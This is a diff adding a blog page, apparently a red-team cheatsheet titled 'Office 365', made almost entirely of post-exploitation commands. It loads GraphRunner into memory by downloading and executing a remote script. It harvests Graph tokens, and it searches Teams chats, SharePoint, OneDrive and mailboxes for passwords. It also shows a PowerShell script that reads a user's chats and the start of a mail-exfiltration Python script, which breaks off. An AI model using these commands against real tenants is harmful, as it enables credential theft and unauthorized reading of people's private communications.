@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="GraphRunner Import into memory
+IEX (iwr &#39;https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1&#39;) Get-GraphTokens User and Password Get-GraphTokens –UserPasswordAuth Microsoft Teams Messages GraphRunner Chat
+Search:
+Invoke-SearchTeams -Tokens $tokens -SearchTerm password Dump:
+Invoke-SearchTeams -Tokens $tokens -SearchTerm password Get-TeamsChat -Tokens $tokens Channels
+Get-TeamsChannels Find-ChannelEmails TokenTacticsV2 RefreshTo-MSTeamsToken -domain domain.local AADInternals Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName Sharepoint and OneDrive Files GraphRunner Search:
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm &#39;bonus&#39; MgGraph $userId = &#34;&lt;user-id&gt;&#34; Import-Module Microsoft.Graph.Files Get-MgUserDefaultDrive -UserId $userId Get-MgUserDrive -UserId $UserId -Debug Get-MgDrive -top 1 Powershell code to retrieve the user’s chat messages:" />
+<meta name="keywords" content=", blog" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://kafka-esc.com/copilot-conversations/office-365/" />
+
+
+
+    <title>
+        
+            Office 365 :: [KafkaEsc] 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.8f3fd8f14a1cc32b54de4b1ee31cf5c5391d167ecd3fc092f3d4e0a342bb258f.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+    <meta name="theme-color" content="">
+
+
+
+
+  <meta itemprop="name" content="Office 365">
+  <meta itemprop="description" content="GraphRunner Import into memory
+IEX (iwr &#39;https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1&#39;) Get-GraphTokens User and Password Get-GraphTokens –UserPasswordAuth Microsoft Teams Messages GraphRunner Chat
+Search:
+Invoke-SearchTeams -Tokens $tokens -SearchTerm password Dump:
+Invoke-SearchTeams -Tokens $tokens -SearchTerm password Get-TeamsChat -Tokens $tokens Channels
+Get-TeamsChannels Find-ChannelEmails TokenTacticsV2 RefreshTo-MSTeamsToken -domain domain.local AADInternals Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName Sharepoint and OneDrive Files GraphRunner Search:
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm &#39;bonus&#39; MgGraph $userId = &#34;&lt;user-id&gt;&#34; Import-Module Microsoft.Graph.Files Get-MgUserDefaultDrive -UserId $userId Get-MgUserDrive -UserId $UserId -Debug Get-MgDrive -top 1 Powershell code to retrieve the user’s chat messages:">
+  <meta itemprop="datePublished" content="2024-09-07T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-09-07T14:38:14+00:00">
+  <meta itemprop="wordCount" content="551">
+  <meta itemprop="image" content="https://kafka-esc.com/">
+  <meta itemprop="keywords" content="Blog">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://kafka-esc.com/">
+  <meta name="twitter:title" content="Office 365">
+  <meta name="twitter:description" content="GraphRunner Import into memory
+IEX (iwr &#39;https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1&#39;) Get-GraphTokens User and Password Get-GraphTokens –UserPasswordAuth Microsoft Teams Messages GraphRunner Chat
+Search:
+Invoke-SearchTeams -Tokens $tokens -SearchTerm password Dump:
+Invoke-SearchTeams -Tokens $tokens -SearchTerm password Get-TeamsChat -Tokens $tokens Channels
+Get-TeamsChannels Find-ChannelEmails TokenTacticsV2 RefreshTo-MSTeamsToken -domain domain.local AADInternals Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName Sharepoint and OneDrive Files GraphRunner Search:
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm &#39;bonus&#39; MgGraph $userId = &#34;&lt;user-id&gt;&#34; Import-Module Microsoft.Graph.Files Get-MgUserDefaultDrive -UserId $userId Get-MgUserDrive -UserId $UserId -Debug Get-MgDrive -top 1 Powershell code to retrieve the user’s chat messages:">
+
+
+
+    <meta property="og:url" content="https://kafka-esc.com/copilot-conversations/office-365/">
+  <meta property="og:site_name" content="[KafkaEsc]">
+  <meta property="og:title" content="Office 365">
+  <meta property="og:description" content="GraphRunner Import into memory
+IEX (iwr &#39;https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1&#39;) Get-GraphTokens User and Password Get-GraphTokens –UserPasswordAuth Microsoft Teams Messages GraphRunner Chat
+Search:
+Invoke-SearchTeams -Tokens $tokens -SearchTerm password Dump:
+Invoke-SearchTeams -Tokens $tokens -SearchTerm password Get-TeamsChat -Tokens $tokens Channels
+Get-TeamsChannels Find-ChannelEmails TokenTacticsV2 RefreshTo-MSTeamsToken -domain domain.local AADInternals Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName Sharepoint and OneDrive Files GraphRunner Search:
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm &#39;bonus&#39; MgGraph $userId = &#34;&lt;user-id&gt;&#34; Import-Module Microsoft.Graph.Files Get-MgUserDefaultDrive -UserId $userId Get-MgUserDrive -UserId $UserId -Debug Get-MgDrive -top 1 Powershell code to retrieve the user’s chat messages:">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="copilot-conversations">
+    <meta property="article:published_time" content="2024-09-07T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-09-07T14:38:14+00:00">
+    <meta property="article:tag" content="Blog">
+    <meta property="og:image" content="https://kafka-esc.com/">
+
+
+
+
+    <meta property="article:section" content="blog" />
+
+
+
+    <meta property="article:published_time" content="2024-09-07 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark"> </span>
+            <span class="logo__text">/home/KafkaEsc</span>
+            <span class="logo__cursor" style=
+                  "visibility:hidden;
+                   background-color:#67a2c9;
+                   animation-duration:3s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+                <li><a href="/about/">About</a></li>
+                <li><a href="/posts/">Posts</a></li>
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/categories/" class="dropbtn">Resources</a>
+                        <label class="drop-icon" for="Resources">▾</label>
+                        <div class="dropdown-content">
+                                
+                                    <a title="Write Ups" href="/categories/writeups/">Write Ups</a>
+                                
+                                    <a title="Tutorials" href="/categories/tutorials/">Tutorials</a>
+                                
+                                    <a title="Cheatsheets" href="/categories/cheatsheets/">Cheatsheets</a>
+                                
+                        </div>
+                    </li>
+                </div>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://kafka-esc.com/copilot-conversations/office-365/">Office 365</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h2 id="graphrunnertoolsgraphrunnermd"><a href="/Tools/GraphRunner.md">GraphRunner</a></h2>
+<p><strong>Import into memory</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">IEX </span><span style="color:#eceff4">(</span><span style="color:#81a1c1">iwr </span><span style="color:#a3be8c">&#39;https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1&#39;</span><span style="color:#eceff4">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">Get-GraphTokens</span>
+</span></span></code></pre></div><h4 id="user-and-password">User and Password</h4>
+<pre tabindex="0"><code>Get-GraphTokens –UserPasswordAuth
+</code></pre><hr>
+<h2 id="microsoft-teams-messages">Microsoft Teams Messages</h2>
+<h3 id="graphrunner">GraphRunner</h3>
+<p><strong>Chat</strong><br>
+Search:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Invoke-SearchTeams</span> -Tokens $tokens -SearchTerm password
+</span></span></code></pre></div><p>Dump:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Invoke-SearchTeams</span> -Tokens $tokens -SearchTerm password
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">Get-TeamsChat</span> -Tokens $tokens
+</span></span></code></pre></div><p><strong>Channels</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Get-TeamsChannels</span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">Find-ChannelEmails</span>
+</span></span></code></pre></div><h3 id="tokentacticsv2">TokenTacticsV2</h3>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">RefreshTo-MSTeamsToken</span> -domain domain<span style="color:#eceff4">.</span><span style="color:#8fbcbb">local</span>
+</span></span></code></pre></div><h3 id="aadinternals">AADInternals</h3>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Get-AADIntTeamsMessages</span> -AccessToken $MSTeamsToken<span style="color:#eceff4">.</span><span style="color:#8fbcbb">access_token</span> <span style="color:#eceff4">|</span> <span style="color:#81a1c1">Format-Table</span> id<span style="color:#eceff4">,</span>content<span style="color:#eceff4">,</span>deletiontime<span style="color:#eceff4">,*</span>type<span style="color:#eceff4">*,</span>DisplayName
+</span></span></code></pre></div><hr>
+<h2 id="sharepoint-and-onedrive-files">Sharepoint and OneDrive Files</h2>
+<h3 id="graphrunner-1">GraphRunner</h3>
+<p>Search:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Invoke-SearchSharePointAndOneDrive</span> -Tokens $tokens -SearchTerm <span style="color:#a3be8c">&#39;bonus&#39;</span>
+</span></span></code></pre></div><h3 id="mggraph">MgGraph</h3>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$userId <span style="color:#eceff4">=</span> <span style="color:#a3be8c">&#34;&lt;user-id&gt;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">Import-Module</span> Microsoft<span style="color:#eceff4">.</span><span style="color:#8fbcbb">Graph</span><span style="color:#eceff4">.</span><span style="color:#8fbcbb">Files</span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">Get-MgUserDefaultDrive</span> -UserId $userId
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">Get-MgUserDrive</span> -UserId $UserId  -Debug
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">Get-MgDrive</span> -top <span style="color:#b48ead">1</span>
+</span></span></code></pre></div><p>Powershell code to retrieve the user’s chat messages:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Powershell" data-lang="Powershell"><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"># Variables</span>
+</span></span><span style="display:flex;"><span>$tenantId <span style="color:#eceff4">=</span> <span style="color:#a3be8c">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>$clientId <span style="color:#eceff4">=</span> <span style="color:#a3be8c">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>$clientSecret <span style="color:#eceff4">=</span> <span style="color:#a3be8c">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"># Get an OAuth 2.0 token</span>
+</span></span><span style="display:flex;"><span>$body <span style="color:#eceff4">=</span> @<span style="color:#eceff4">{</span>
+</span></span><span style="display:flex;"><span>	client_id <span style="color:#eceff4">=</span> $clientId
+</span></span><span style="display:flex;"><span>	scope <span style="color:#eceff4">=</span> <span style="color:#a3be8c">&#34;https://graph.microsoft.com/.default&#34;</span>
+</span></span><span style="display:flex;"><span>	client_secret <span style="color:#eceff4">=</span> $clientSecret
+</span></span><span style="display:flex;"><span>	grant_type <span style="color:#eceff4">=</span> <span style="color:#a3be8c">&#34;client_credentials&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#eceff4">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$tokenResponse <span style="color:#eceff4">=</span> <span style="color:#81a1c1">Invoke-RestMethod</span> -Method Post -Uri <span style="color:#a3be8c">&#34;https://login.microsoftonline.com/</span>$tenantId<span style="color:#a3be8c">/oauth2/v2.0/token&#34;</span> -ContentType <span style="color:#a3be8c">&#34;application/x-www-form-urlencoded&#34;</span> -Body $body
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$accessToken <span style="color:#eceff4">=</span> $tokenResponse<span style="color:#eceff4">.</span><span style="color:#8fbcbb">access_token</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"># Use the token to call Microsoft Graph API</span>
+</span></span><span style="display:flex;"><span>$headers <span style="color:#eceff4">=</span> @<span style="color:#eceff4">{</span>
+</span></span><span style="display:flex;"><span>	Authorization <span style="color:#eceff4">=</span> <span style="color:#a3be8c">&#34;Bearer </span>$accessToken<span style="color:#a3be8c">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#eceff4">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"># Get the target User ID by the filter clause</span>
+</span></span><span style="display:flex;"><span>$user <span style="color:#eceff4">=</span> <span style="color:#eceff4">(</span><span style="color:#81a1c1">Invoke-RestMethod</span> -Method Get -Uri <span style="color:#a3be8c">&#34;https://graph.microsoft.com/v1.0/users?</span><span style="color:#ebcb8b">`$</span><span style="color:#a3be8c">filter=displayName eq &#39;alexos&#39;&amp;</span><span style="color:#ebcb8b">`$</span><span style="color:#a3be8c">Select=ID,displayName&#34;</span> -Headers $headers<span style="color:#eceff4">).</span><span style="color:#8fbcbb">value</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"># List all chats for the User</span>
+</span></span><span style="display:flex;"><span>$messageId <span style="color:#eceff4">=</span> <span style="color:#eceff4">(</span><span style="color:#81a1c1">Invoke-RestMethod</span> -Method Get -Uri <span style="color:#a3be8c">&#34;https://graph.microsoft.com/v1.0/Users/</span><span style="color:#eceff4">$(</span>$user<span style="color:#eceff4">.</span>id<span style="color:#eceff4">)</span><span style="color:#a3be8c">/chats&#34;</span> -Headers $headers<span style="color:#eceff4">).</span><span style="color:#8fbcbb">value</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">Clear-Host</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">Write-Host</span> <span style="color:#a3be8c">&#34;[+] Chat messages from: &#34;</span> -ForegroundColor Magenta -NoNewline
+</span></span><span style="display:flex;"><span>$user<span style="color:#eceff4">.</span><span style="color:#8fbcbb">displayName</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">foreach</span> <span style="color:#eceff4">(</span>$messageInfo <span style="color:#81a1c1;font-weight:bold">in</span> <span style="color:#eceff4">(</span>$messageId<span style="color:#eceff4">.</span>id<span style="color:#eceff4">))</span> <span style="color:#eceff4">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#616e87;font-style:italic"># Get the chat message content for each message sent to the user</span>
+</span></span><span style="display:flex;"><span>	$message <span style="color:#eceff4">=</span> <span style="color:#eceff4">(</span><span style="color:#81a1c1">Invoke-RestMethod</span> -Method Get -Uri <span style="color:#a3be8c">&#34;https://graph.microsoft.com/v1.0/Users/362a96a5-1ac3-44ec-8017-408a4829459f/chats/</span>$messageInfo<span style="color:#a3be8c">/messages&#34;</span> -Headers $headers<span style="color:#eceff4">).</span><span style="color:#8fbcbb">value</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#81a1c1;font-weight:bold">foreach</span> <span style="color:#eceff4">(</span>$msg <span style="color:#81a1c1;font-weight:bold">in</span> <span style="color:#eceff4">(</span>$message<span style="color:#eceff4">.</span><span style="color:#8fbcbb">body</span><span style="color:#eceff4">.</span>content<span style="color:#eceff4">))</span> <span style="color:#eceff4">{</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#81a1c1">Write-Host</span> <span style="color:#a3be8c">&#34; [+] Message: &#34;</span> -ForegroundColor Yellow -NoNewline
+</span></span><span style="display:flex;"><span>		$msg
+</span></span><span style="display:flex;"><span>	<span style="color:#eceff4">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#eceff4">}</span>
+</span></span></code></pre></div><hr>
+<h2 id="outlook-mails">Outlook Mails</h2>
+<h3 id="graphrunner-2">GraphRunner</h3>
+<p>Search:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Invoke-SearchMailbox</span> -Tokens $tokens -SearchTerm <span style="color:#a3be8c">&#34;password&#34;</span> -MessageCount <span style="color:#b48ead">40</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Get-Inbox</span> -userid Clara<span style="color:#eceff4">.</span>Miller@megabigtech<span style="color:#eceff4">.</span><span style="color:#8fbcbb">com</span> -Tokens $tokens
+</span></span></code></pre></div><p><strong>Sharepoint Endpoints</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Get-SharePointSiteURLs</span>
+</span></span></code></pre></div><h3 id="mggraph-1">MgGraph</h3>
+<p><strong>Read user mails</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Get-MgUserMessage</span> -UserId <span style="color:#eceff4">&lt;</span><span style="color:#81a1c1">user-id</span><span style="color:#eceff4">&gt;</span> <span style="color:#eceff4">|</span> <span style="color:#81a1c1">ft
+</span></span></span><span style="display:flex;"><span><span style="color:#81a1c1">Get-MgUserMessageContent</span> -OutFile mail<span style="color:#eceff4">.</span><span style="color:#8fbcbb">txt</span> -UserId <span style="color:#eceff4">&lt;</span><span style="color:#81a1c1">user-id</span><span style="color:#eceff4">&gt;</span> -MessageId <span style="color:#eceff4">&lt;</span><span style="color:#81a1c1">message-id</span><span style="color:#eceff4">&gt;</span>
+</span></span></code></pre></div><p>Lists all the client IDs you can use to get a token with the <code>mail.read</code> scope on the Microsoft Graph:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>roadtx getscope -s https<span style="color:#bf616a">:</span><span style="color:#eceff4">//</span>graph<span style="color:#eceff4">.</span><span style="color:#8fbcbb">microsoft</span><span style="color:#eceff4">.</span>com<span style="color:#eceff4">/</span>mail<span style="color:#eceff4">.</span><span style="color:#8fbcbb">read</span>
+</span></span><span style="display:flex;"><span>roadtx findscope -s https<span style="color:#bf616a">:</span><span style="color:#eceff4">//</span>graph<span style="color:#eceff4">.</span><span style="color:#8fbcbb">microsoft</span><span style="color:#eceff4">.</span>com<span style="color:#eceff4">/</span>mail<span style="color:#eceff4">.</span><span style="color:#8fbcbb">read</span>
+</span></span></code></pre></div><h3 id="read-user-inbox-email">Read User inbox email</h3>
+<h4 id="exfil_exchange_mailpy">exfil_exchange_mail.py</h4>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">import</span> <span style="color:#8fbcbb">requests</span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">import</span> <span style="color:#8fbcbb">json</span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">import</span> <span style="color:#8fbcbb">base64</span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">import</span> <span style="color:#8fbcbb">requests</span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">from</span> <span style="color:#8fbcbb">argparse</span> <span style="color:#81a1c1;font-weight:bold">import</span> ArgumentParser
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"># This script requires a token from graph.microsoft.com</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"># Proxy through Burp</span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">def</span> <span style="color:#88c0d0">get_proxy</span><span style="color:#eceff4">(</span>proxy_url<span style="color:#eceff4">):</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1;font-weight:bold">return</span> <span style="color:#eceff4">{</span><span style="color:#a3be8c">&#39;http&#39;</span><span style="color:#eceff4">:</span> proxy_url<span style="color:#eceff4">,</span> <span style="color:#a3be8c">&#39;https&#39;</span><span style="color:#eceff4">:</span> proxy_url<span style="color:#eceff4">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">def</span> <span style="color:#88c0d0">main</span><span style="color:#eceff4">():</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#616e87;font-style:italic"># Set up authentication parameters</span>
+</span></span><span style="display:flex;"><span>    parser <span style="color:#81a1c1">=</span> ArgumentParser<span style="color:#eceff4">(</span><span style="color:#a3be8c">&#39;exfil_exchange_mail.py&#39;</span><span style="color:#eceff4">)</span>
+</span></span><span style="display:flex;"><span>    parser<span style="color:#81a1c1">.</span>add_argument<span style="color:#eceff4">(</span><span style="color:#a3be8c">&#39;--burp&#39;</span><span style="color:#eceff4">,</span> action<span style="color:#81a1c1">=</span><span style="color:#a3be8c">&#39;store_true&#39;</span><span style="color:#eceff4">,</span> help<span style="color:#81a1c1">=</span><span style="color:#a3be8c">&#39;Use Burp as proxy, default=http://127.0.0.1:8080&#39;</span><span style="color:#eceff4">)</span>
+</span></span><span style="display:flex;"><span>    parser<span style="color:#81a1c1">.</span>add_argument<span style="color:#eceff4">(</span><span style="color:#a3be8c">&#39;-t&#39;</span><span style="color:#eceff4">,</span> <span style="color:#a3be8c">&#39;--token&#39;</span><span style="color:#eceff4">,</span> help<span style="color:#81a1c1">=</span><span style="color:#a3be8c">&#39;MS Graph Token&#39;</span><span style="color:#eceff4">,</span> required<span style="color:#81a1c1">=</span><span style="color:#81a1c1;font-weight:bold">True</span><span style="color:#eceff4">)</span>
+</span></span><span style="display:flex;"><span>    parser<span style="color:#81a1c1">.</span>add_argument<span style="color:#eceff4">(</span><span style="color:#a3be8c">&#39;-u&#39;</span><span style="color:#eceff4">,</span> <span style="color:#a3be8c">&#39;--username&#39;</span><span style="color:#eceff4">,</span> help<span style="color:#81a1c1">=</span><span style="color:#a3be8c">&#39;Username or ObjectId to be used in API requests&#39;</span><span style="color:#eceff4">,</span> required<span style="color:#81a1c1">=</span><span style="color:#81a1c1;font-weight:bold">True</span><span style="color:#eceff4">)</span>
+</span></span><span style="display:flex;"><span>    args <span style="color:#81a1c1">=</span> parser<span style="color:#81a1c1">.</span>parse_args<span style="color:#eceff4">()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    proxy_url <span style="color:#81a1c1">=</span> <span style="color:#a3be8c">&#39;http://127.0.0.1:8080&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1;font-weight:bold">if</span> args<span style="color:#81a1c1">.</span>burp<span style="color:#eceff4">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#81a1c1">print</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">f</span><span style="color:#a3be8c">&#34;Using Burp Proxy at </span><span style="color:#a3be8c">{</span>proxy_url<span style="color:#a3be8c">}</span><span style="color:#a3be8c">&#34;</span><span style="color:#eceff4">)</span>
+</span></span><span style="display:flex;"><span>        proxies <span style="color:#81a1c1">=</span> get_proxy<span style="color:#eceff4">(</span>proxy_url<span style="color:#eceff4">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1;font-weight:bold">else</span><span style="color:#eceff4">:</span>
+</span></span><span style="display:flex;"><span>        proxies <span style="color:#81a1c1">=</span> <span style="color:#81a1c1;font-weight:bold">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    token <span style="color:#81a1c1">=</span> args<span style="color:#81a1c1">.</span>token
+</span></span><span style="display:flex;"><span>    username <span style="color:#81a1c1">=</span> args<span style="color:#81a1c1">.</span>username
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    headers <span style="color:#81a1c1">=</span> <span style="color:#eceff4">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a3be8c">&#39;Authorization&#39;</span><span style="color:#eceff4">:</span> <span style="color:#a3be8c">&#39;Bearer &#39;</span> <span style="color:#81a1c1">+</span> token<span style="color:#eceff4">,</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a3be8c">&#39;Content-Type&#39;</span><span style="color:#eceff4">:</span> <span style="color:#a3be8c">&#39;application/json&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#616e87;font-style:italic"># Define the endpoint to retrieve emails</span>
+</span></span><span style="display:flex;"><span>    endpoint <span style="color:#81a1c1">=</span> <span style="color:#a3be8c">f</span><span style="color:#a3be8c">&#39;https://graph.microsoft.com/v1.0/users/</span><span style="color:#a3be8c">{</span>username<span style="color:#a3be8c">}</span><span style="color:#a3be8c">/messages?$select=subject,body&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#616e87;font-style:italic"># Send a GET request to the endpoint to retrieve emails</span>
